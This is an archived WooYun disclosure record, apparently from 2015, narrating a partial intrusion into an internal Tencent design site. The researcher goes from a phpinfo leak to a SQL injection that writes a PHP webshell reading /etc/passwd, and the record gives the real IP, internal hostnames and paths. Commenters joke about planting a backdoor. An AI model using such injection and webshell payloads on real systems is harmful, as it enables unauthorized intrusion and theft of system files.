{"id": 28837, "wybug_id": "wooyun-2015-0121069", "wybug_title": "从一个phpinfo到一次半途而废的腾讯内网漫游之旅", "wybug_corp": "腾讯", "wybug_author": "举起手来", "wybug_date": "2015-06-17 10:19", "wybug_open_date": "2015-06-17 10:47", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-17：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 从一个phpinfo到一次半途而废的腾讯内网漫游之旅；哎，腾讯反应有点快啊，搞了一会，吃个饭回来；尼玛下线了。卧槽啊，分享下思路。 详细说明：  一、扫到了腾讯几个小问题，比如phpinfo之类的：\n\n\n\n二、深入（一波三折）从上面扫到的几个漏洞来看,183.61.39.187这个IP存在两个web目录：\nhttp://183.61.39.187/brand/http://183.61.39.187/sola/\n其中这个http://183.61.39.187/brand/ 就是一哥日过的那个ycg.qq.com;当时我访问到这个，我都惊呆了，知道有戏；然而，我选择了http://183.61.39.187/sola/这个，因为上面那个目录并没有什么卵用。这个sola是他们内部一些搞设计的自己搭的站，访问首页直接尼玛跳到\nhttp://passport.oa.com/modules/passport/signin.ashx?url=http://isux.oa.com/sola/\n然而，根据我多年的经验，这特么是个内部用的站啊。passport.oa.com是腾讯内部统一认证登陆的接口。好，紧接着我屏蔽这个跳转，发现首页是一个上传，兴奋。。。结果，尼玛竟然不能传php，撸了几种上传姿势，硬是没搞定，上传接口如下：\n<form action=\"http://isux.oa.com/sola/upload.php\" method=\"post\"enctype=\"multipart/form-data\"><label for=\"file\">Filename:</label><input type=\"file\" name=\"files[]\" id=\"file\" /> <br /><input type=\"submit\" name=\"submit\" value=\"Submit\" /></form>\n但是，但是我抓到一个另外的接口\nhttp://isux.oa.com/sola/server/showPic.phpuser=\n恩，很不错，存在注入漏洞。那么我来写个文件试试；web目录是我从phpinfo里看到的—_-!\nhttp://isux.oa.com/sola/server/showPic.phpuser=1' union select 1,\"<?php system('ps aux')?>\",load_file('/etc/passwd'),4,5,6,7,8,9,0 into outfile \"/data/imgcache/htdocs/sola/public/1k23hj1k22b.php\" -- ;\n竟然上传成功了，惊呆了\n\n好了，饿了，回家吃饭，结果，吃完饭回来，尼玛下线了,,,   漏洞证明：  \n\n   修复方案：  已经下线了。。。   版权声明：转载请注明来源 举起手来@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-06-17 10:33 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 2015-06-17：渗透行为发生时被安全系统检测到，业务已下线  ", "replys": "漏洞评价：\n评论\n     2015-06-17 10:33 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  速度不错    \n     2015-06-17 10:51 |    \t\tCplusHua \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:33        | 乌云奖金:-1)\t\t \n  说了多少次,千万不要phpinfo..........    \n     2015-06-17 10:52 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  检测到就能给1分了?    \n     2015-06-17 11:03 |    \t\t继续沉默 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 好好学习，天天向上)\t\t \n  说了多少次,千万不要phpinfo.......... 关键字被检测到了    \n     2015-06-17 11:15 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  他们有“洋葱”    \n     2015-06-17 11:31 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  腾讯牛逼啊    \n     2015-06-17 11:32 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  你好1分    \n     2015-06-17 11:35 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  卧槽 就1分    \n     2015-06-17 12:12 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  检测到了就给1分？2333333333    \n     2015-06-17 12:24 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  waf认识你了，小哥。    \n     2015-06-17 12:34 |    \t\tjeary \t\t\t( 普通白帽子  |\t\t\t        Rank:296 漏洞数:106        | (:‮.kcaH eb nac gnihtynA))\t\t \n  听说请求腾讯的站加上各种关键字，腾讯某些人就得忙起来，不知道这是不是真的..    \n     2015-06-17 13:15 |    \t\twy007 \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:10        | 其实我是一名卧底...)\t\t \n  又学习新姿势了...    \n     2015-06-17 13:43 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  渗透行为发生时被安全系统检测到，业务已下线尼玛好强大！    \n     2015-06-17 13:50 |    \t\trasca1 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:16        | 菜鸟一只)\t\t \n  我比较好奇这个   oa你是怎么跳转进去的    \n     2015-06-17 13:53 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  吃个饭回来；尼玛下线了。卧槽啊    \n     2015-06-17 13:58 |    \t\tchock \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:15        | 今夜我们都是wooyun人，我们一定要收购长亭)\t\t \n  说了多少次,千万不要phpinfo..........     \n     2015-06-17 13:58 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  记住了，下次搞站的时候，备好干粮，去吃啥饭嘛！！    \n     2015-06-17 14:08 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  才一分啊，大腾讯太小气了吧，啥理由也没有就1分？大家都别去tsrc了，直接发贴分享吧！    \n     2015-06-17 14:16 |    \t\trasca1 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:16        | 菜鸟一只)\t\t \n  @PgHook 9494放个后门再去吃啊    \n     2015-06-17 14:21 |    \t\tPyNerd \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | Just for shell.)\t\t \n  腾讯的内网敏感，下次还是不要提交tsrc直接发出来分享吧    \n     2015-06-17 14:23 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-06-17 14:36 |    \t\tB1gstar \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:6        | 向各位学习来了。)\t\t \n  喜欢这个节奏，速度公开    \n     2015-06-17 14:43 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:25        | 逆水行舟，不进则退。)\t\t \n  牛逼  一提交就公开    \n     2015-06-17 15:19 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  每次搞到**洞 还没提交 就已经检测到 然后给修复 在提交忽略的说    \n     2015-06-17 15:34 |    \t\twhitehat \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 用心，認真，努力，負責任...)\t\t \n  渗透行为发生时被就被检测到了，这系统厉害啊    \n     2015-06-17 15:43 |    \t\t哲璇 \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:31        | 低调奢华)\t\t \n  速度真快    \n     2015-06-17 15:58 |    \t\t白开水 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:27        | 苍茫的天涯是我的爱~)\t\t \n  哈哈哈哈  吃个饭下线了    \n     2015-06-17 16:33 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  老大说了：腾讯牛逼啊    \n     2015-06-17 17:12 |    \t\tZephyrus \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:7        | 静心学习)\t\t \n  腾讯这反映略快啊    \n     2015-06-17 18:32 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  记住了，下次搞站的时候，备好干粮，去吃啥饭嘛！！    \n     2015-06-17 19:23 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  以后要拼手速的    \n     2015-06-17 19:31 |    \t\tJGHOOluwa \t\t\t( 普通白帽子  |\t\t\t        Rank:206 漏洞数:32        | 就是来看看大牛们如何超神的^-^)\t\t \n  这时候你会发现一个妹纸多么重要了，当你撸站饿了的时候她主动给你送来饭，让你张嘴喂你吃，伙计，你缺的不是技术，缺的是送饭的妹纸啊！！！    \n     2015-06-17 20:17 |    \t\t小熊饼干 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:6        | 酱油专业户)\t\t \n  用1分来说明下“安全系统”，然而这有卵用？    \n     2015-06-17 20:48 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  洞主， 这说明不了什么，，这说明腾讯还给你挖洞的机会。。。加油看好你    \n     2015-06-17 23:34 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  渗透行为发生时被安全系统检测到，业务已下线，还是腾讯牛逼！    \n     2015-06-19 11:13 |    \t\t我来你网 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 这世界人来人网我来你网)\t\t \n  学习了    \n     2015-06-21 07:23 |    \t\tNing \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:6        )\t\t \n  渗透行为发生时被安全系统检测到，业务已下线    \n     2015-06-24 08:17 |    \t\t3ang \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 风往北吹，你走的好干脆！)\t\t \n  渗透行为发生时被安全系统检测到，业务已下线    \n     2015-06-26 18:35 |    \t\tucifer \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:52        | 萌萌哒~)\t\t \n  这洞不止1rank吧，虽然已经被检测到了    \n     2015-06-29 11:14 |    \t\t李白 \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:29        )\t\t \n  @ucifer 检测到了说明这种方式的攻击是可控的，在实际环境中危害并不是很大，但1rank确实不太合理    \n     2015-07-05 18:09 |    \t\tLoser \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 蓝翔手扶拖拉机专业。)\t\t \n  23333真是到爆炸啊= =可能因为是业务及时下架，所以才给1分吧    \n     2015-07-22 21:16 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n  才一分啊，大腾讯太小气了吧，啥理由也没有就1分？大家都别去tsrc了，直接发贴分享吧！    \n     2015-08-18 13:47 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:59        | http://www.tomatoyu.com/)\t\t \n  检测到就能给1分了?    \n     2015-09-13 16:11 |    \t\thell0123 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 混圈子，学姿势)\t\t \n  @jeary 一有关键字就人工检测，这劳动力有点大啊...    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}